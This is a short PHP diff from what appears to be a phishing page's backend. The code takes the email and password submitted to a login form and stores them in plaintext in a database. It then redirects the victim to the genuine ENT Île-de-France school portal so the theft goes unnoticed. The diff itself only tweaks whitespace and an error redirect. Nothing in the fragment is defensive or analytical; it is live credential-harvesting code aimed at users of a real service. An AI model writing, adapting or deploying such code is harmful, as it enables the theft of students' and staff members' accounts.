@@ -5,7 +5,7 @@ if(isset($_POST["connexion"])) {
     $login = $_POST["email"];
     $mdp = $_POST["password"];
     $date = date('Y-m-d H:i:s');
-
+    
     $create = $DB->prepare("INSERT INTO utilisateur (login, mdp, date_login) VALUES (:login, :mdp, :date_login)");
 
     $create->bindValue(":login", $login);
@@ -16,5 +16,5 @@ if(isset($_POST["connexion"])) {
 
     header("Location: https://ent.iledefrance.fr/");
 } else {
-    echo "nop";
+    header("Location: index.php?erreur=05518698SHA5181ASS8S53SA");
 }
